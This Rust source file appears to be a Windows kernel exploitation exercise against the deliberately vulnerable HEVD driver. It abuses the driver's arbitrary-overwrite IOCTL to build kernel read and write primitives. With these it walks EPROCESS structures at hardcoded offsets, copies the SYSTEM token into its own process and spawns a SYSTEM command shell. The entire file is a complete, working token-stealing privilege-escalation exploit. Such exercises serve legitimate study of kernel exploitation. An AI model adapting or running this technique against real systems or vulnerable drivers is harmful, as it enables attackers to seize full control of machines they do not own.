use std::{ffi::c_void, mem::size_of, ptr::null_mut};

use exploitation::{
    get_device_handle, get_driver_base_address, get_function_address_by_name, spawn_shell,
    DEVICE_NAME, HEVD_IOCTL_ARBITRARY_OVERWRITE,
};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::{Threading::GetCurrentProcessId, IO::DeviceIoControl},
};

#[derive(Debug, Clone, Copy)]
pub struct WriteWhatWhere {
    what_value: *mut c_void,
    where_value: *mut c_void,
}

mod old_way;

pub static mut DEVICE_HANDLE: isize = 0;

fn main() {
    println!(
        "### Windows Kernel Exploitation - Arbitrary Overwrite (Write-What-Where) by memN0ps ###"
    );
    println!("[+] Gathering Kernel Information");

    let ntoskrnl_kernel_addy = match get_driver_base_address("ntoskrnl.exe") {
        Ok(address) => address,
        Err(e) => panic!("[-] Failed to get ntoskrnl.exe base address: {}", e),
    };

    println!("\t[*] Loaded Kernel: ntoskrnl.exe");
    println!("\t[*] Base Address: {:#x}", ntoskrnl_kernel_addy);

    println!("[+] Resolving PsInitialSystemProcess");

    let (ntoskrnl_user_addy, mut ps_initial_system_process) =
        match get_function_address_by_name("ntoskrnl.exe\0", "PsInitialSystemProcess\0") {
            Ok((ntoskrnl_addy, hal_addy)) => (ntoskrnl_addy, hal_addy),
            Err(e) => panic!(
                "[-] Failed to get PsInitialSystemProcess table address: {}",
                e
            ),
        };

    println!(
        "\t[*] User Mode PsInitialSystemProcess Address: {:#x}",
        ps_initial_system_process
    );

    /* Subtract ntoskrnl base in user mode to get the offset */
    ps_initial_system_process -= ntoskrnl_user_addy as u64;
    println!(
        "\t[*] PsInitialSystemProcess Offset: {:#x}",
        ps_initial_system_process
    );

    /* To find PsInitialSystemProcess address in kernel land add the base of ntoskrnl in kernel land */
    ps_initial_system_process += ntoskrnl_kernel_addy as u64;
    println!(
        "\t[*] Kernel Mode PsInitialSystemProcess Address: {:#x}",
        ps_initial_system_process
    );

    /* Get a handle to the vulnerable kernel driver */
    println!("[+] Opening Vulnerable Device: {}", DEVICE_NAME);

    unsafe {
        DEVICE_HANDLE = match get_device_handle(DEVICE_NAME) {
            Ok(handle) => handle,
            Err(e) => panic!("[-] Failed to get device handle: {}", e),
        };
        println!("\t[*] Device Handle: {:#x}", DEVICE_HANDLE);
    }

    let system_eprocess = read(ps_initial_system_process);
    println!("\t[*] SYSTEM EPROCESS: {:p}", system_eprocess);

    let current_pid = unsafe { GetCurrentProcessId() };

    steal_token(system_eprocess, current_pid);

    println!("[+] Token Copied.");

    println!("[+] Closing Device Handle");

    /* Closes an open object handle. */
    // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/Foundation/fn.CloseHandle.html
    if unsafe { CloseHandle(DEVICE_HANDLE) } == 0 {
        panic!("[-] Failed to close device handle: {}", unsafe {
            GetLastError()
        });
    }

    /* we have successfully elevated our privileges */
    println!("[+] Spawning CMD With SYSTEM Privilege");
    let _pid = match spawn_shell() {
        Ok(_) => println!("[+] W00TW00T NT AUTHORITY\\SYSTEM"),
        Err(e) => panic!("[-] Failed to spawn CMD: {}", e),
    };
}

pub fn read(where_value: u64) -> *mut c_void {
    /* Prepare the buffer that needs to be sent to the */
    println!("[+] Write-What-Where Structure");

    let what_addy: *mut c_void = null_mut();
    let what_ptr_addy = &what_addy as *const _;

    let write_what_where = WriteWhatWhere {
        what_value: where_value as _,
        where_value: what_ptr_addy as _,
    };

    let write_what_where_ptr = &write_what_where as *const _ as *const c_void;
    let buffer_size: u32 = size_of::<WriteWhatWhere>() as u32;
    println!("\t[*] What: {:p}", write_what_where.what_value);
    println!("\t[*] Where: {:p}", write_what_where.where_value);

    match send_io_control_without_closing_handle(
        unsafe { DEVICE_HANDLE },
        *HEVD_IOCTL_ARBITRARY_OVERWRITE,
        write_what_where_ptr as _,
        buffer_size,
    ) {
        Ok(_) => println!("\t[*] Successfully Sent IOCTL"),
        Err(e) => panic!("[-] Failed to send IOCTL: {}", e),
    };

    return what_addy;
}

pub fn steal_token(system_eprocess: *mut c_void, target_pid: u32) {
    /*
        0: kd> dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks UniqueProcessId Token 0xffffd1846ee82380
            +0x2e8 UniqueProcessId    : 0x00000000`00000004 Void
            +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffd184`6eee8370 - 0xfffff804`2f833920 ]
            +0x360 Token              : _EX_FAST_REF
    */

    let mut current_eprocess = system_eprocess as u64;
    let system_token = read(current_eprocess + 0x360);

    // Search for the current process EPROCESS structure
    loop {
        let active_process_links = current_eprocess + 0x2f0;
        let flink = active_process_links;
        let next_process_links = read(flink);
        current_eprocess = next_process_links as u64 - 0x2f0;
        let current_pid = read(current_eprocess + 0x2e8) as u32;

        if current_pid == target_pid {
            println!("\t[*] Found Target PID: {}", current_pid);
            break;
        }
    }

    write(system_token, (current_eprocess + 0x360) as _);
}

pub fn write(what_addy: *mut c_void, where_addy: *mut c_void) {
    /* Prepare the buffer that needs to be sent to the */
    println!("[+] Write-What-Where Structure");

    let what_ptr_addy = &what_addy as *const _;

    let write_what_where = WriteWhatWhere {
        what_value: what_ptr_addy as _,
        where_value: where_addy,
    };

    let write_what_where_ptr = &write_what_where as *const _ as *const c_void;
    let buffer_size: u32 = size_of::<WriteWhatWhere>() as u32;
    println!("\t[*] What: {:p}", write_what_where.what_value);
    println!("\t[*] Where: {:p}", write_what_where.where_value);

    match send_io_control_without_closing_handle(
        unsafe { DEVICE_HANDLE },
        *HEVD_IOCTL_ARBITRARY_OVERWRITE,
        write_what_where_ptr as _,
        buffer_size,
    ) {
        Ok(_) => println!("\t[*] Successfully Sent IOCTL"),
        Err(e) => panic!("[-] Failed to send IOCTL: {}", e),
    };
}

/// Sends a IOCTL directly to a specified device driver and without closing device handle
/// returns Ok if successful and an error if it fails
pub fn send_io_control_without_closing_handle(
    device_handle: HANDLE,
    ioctl: u32,
    buffer: *mut c_void,
    buffer_size: u32,
) -> Result<(), String> {
    let mut bytes_returned = 0;

    /* Sends a control code directly to a specified device driver, causing the corresponding device to perform the corresponding operation. */
    // https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol
    // https://docs.rs/windows-sys/0.48.0/windows_sys/Win32/System/IO/fn.DeviceIoControl.html
    let result = unsafe {
        DeviceIoControl(
            device_handle,
            ioctl,
            buffer,
            buffer_size,
            null_mut(),
            0,
            &mut bytes_returned,
            null_mut(),
        )
    };

    if result == 0 {
        return Err(format!("[-] Error sending IOCTL: {:#x}", unsafe {
            GetLastError()
        }));
    }

    Ok(())
}
